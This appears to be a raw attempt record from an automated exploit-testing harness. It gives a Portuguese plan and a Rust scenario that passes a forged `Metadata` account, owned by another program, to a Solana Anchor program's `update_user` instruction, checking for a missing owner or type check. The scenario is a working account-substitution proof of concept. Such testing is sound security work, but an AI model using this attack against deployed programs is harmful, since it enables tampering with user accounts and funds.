attempts.raw:
{
  "plan": "O cenário monta uma conta `user` legítima pertencente ao programa com dados `User` cujo authority é a carteira do atacante, e uma conta forjada `Metadata` (mesmo tamanho de 32 bytes) com owner diferente do programa. O baseline chama `update_user` com a conta legítima e deve ter sucesso. O ataque chama `update_user` com a conta forjada no lugar da conta `user`, mantendo a mesma authority. O efeito mede se a conta forjada foi aceita e usada, verificando que o owner da conta resultante é diferente do program_id e que os dados permanecem os da conta forjada.",
  "scenario": "let authority = Pubkey::new_unique();
let user_key = Pubkey::new_unique();
let forged_key = Pubkey::new_unique();

let legit_user_data = anchor_account_data("User", &(authority,));
let legit_user = account(&env.program_id, &legit_user_data, None);

let forged_data = anchor_account_data("Metadata", &(authority,));
let forged_owner = Pubkey::new_unique();
let forged_user = account(&forged_owner, &forged_data, None);

let authority_account = wallet(1_000_000_000);

let metas = vec![
    AccountMeta::new(user_key, false),
    AccountMeta::new_readonly(authority, true),
];
let ix = env.anchor_ix("update_user", &(), metas);

let contas = vec![
    (user_key, legit_user.clone()),
    (authority, authority_account.clone()),
];
let baseline = env.baseline("update_user legitimo com conta User do programa", &ix, &contas);

let attack_metas = vec![
    AccountMeta::new(forged_key, false),
    AccountMeta::new_readonly(authority, true),
];
let attack_ix = env.anchor_ix("update_user", &(), attack_metas);

let attack_contas = vec![
    (forged_key, forged_user.clone()),
    (authority, authority_account.clone()),
];
let r = env.attack("update_user com conta forjada Metadata de owner diferente", &attack_ix, &attack_contas);

if r.program_result == ProgramResult::Success {
    let after_forged = after(&r, &forged_key);
    env.effect("conta forjada aceita com owner diferente do programa", after_forged.owner() != &env.program_id);
    env.effect("dados da conta forjada permanecem os do atacante", after_forged.data() == forged_data.as_slice());
}"
}

